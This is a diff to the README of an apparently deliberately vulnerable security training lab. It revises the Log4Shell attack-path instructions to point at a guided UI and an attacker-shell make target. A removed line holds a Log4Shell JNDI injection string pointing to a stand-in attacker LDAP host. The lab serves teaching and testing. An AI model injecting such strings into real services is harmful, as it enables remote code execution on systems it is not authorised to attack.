@@ -98,8 +98,10 @@ Explore and exploit intentional vulnerabilities across different domains.
 
 ### Attack Path 1: Log4Shell (JNDI Injection)
 *   **Target**: Auth Service (:8101) or Inventory Service (:8102).
-*   **Method**: Inject a malicious JNDI string (e.g., `${jndi:ldap://attacker.com/a}`) into request headers or bodies.
-*   **Entry Point**: `http://localhost:8180` (Log4j Lab Entry).
+*   **Method**: Use the embedded RT-Log4j attacker container and training UI to probe the guided services, then compare against the standalone vulnerable app.
+*   **Guided UI**: `http://localhost:8020`
+*   **Attacker Shell**: `make rt-log4j-shell`
+*   **Manual Comparison Target**: `http://localhost:8180`
 
 ### Attack Path 2: MIL-STD-1553 Supply Chain
 *   **Target**: Internal Avionics Serial Bus.
